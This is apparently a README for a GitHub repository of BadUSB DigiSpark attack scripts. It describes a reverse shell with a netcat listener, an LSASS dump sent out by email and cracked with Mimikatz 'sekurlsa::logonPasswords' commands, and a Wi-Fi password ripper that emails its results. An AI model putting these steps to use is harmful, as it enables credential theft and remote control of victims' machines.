# BadUSB-DigiSpark Keyboard #

![alt text](https://ksr-ugc.imgix.net/assets/000/103/753/8e69aa968fcece8a35b644f17b92a939_original.jpg?w=680&fit=max&v=1344375979&auto=format&q=92&s=ca0a704479c3ee828a33780fb2cfd5a6)

### In order to upload the sketches to your DigiSpark you need the following: ###


- #### Download and install the Arduino IDE. ####
~~~~
https://www.arduino.cc/en/Main/Software
~~~~
- #### Configure and install the additional Digispark boards: ####
~~~~
https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
~~~~
- #### Configure your Digisprark setup. ####
~~~~
In the Arduino IDE set your board to (DigiSpark Default 16,5 Mhz) and the programmer to USBtinyISP.
~~~~
- #### Download and install the Digistump Drivers. ####
~~~~
https://github.com/digistump/DigistumpArduino/releases
~~~~


# Reversed Shell #

Simple script for setting up a reversed shell over TCP or UDP and specific port.


## Before you start setup the listener on the remote host. ##

~~~~
Run Netcat
~~~~
~~~~
# nc -ul -p 53
~~~~


You can also use powershell scripts see Powershell directory for the files or instructions below.


# Send-LSASS-Dump #

Started this script for a BadUSB Digispark project, script for retrieving lsass dump with sysinternals procdump tool.
Dump file is automatically send to an email address which can be configured in the variables.

## After receiving the dump file you can examine it and retreive the passwords. ##
~~~~
Run Mimikatz
~~~~
~~~~
mimikatz # sekurlsa::minidump lsass.dmp
~~~~
~~~~
mimikatz # sekurlsa::logonPasswords
~~~~

# Netsh-Ripper #

Started this script for a BadUSB Digispark project, script for retreiving wlan profile information and clear text passwords.
Text file is automatically send to an email address which can be configured in the variables.

### Only use this for learning purposes. ###
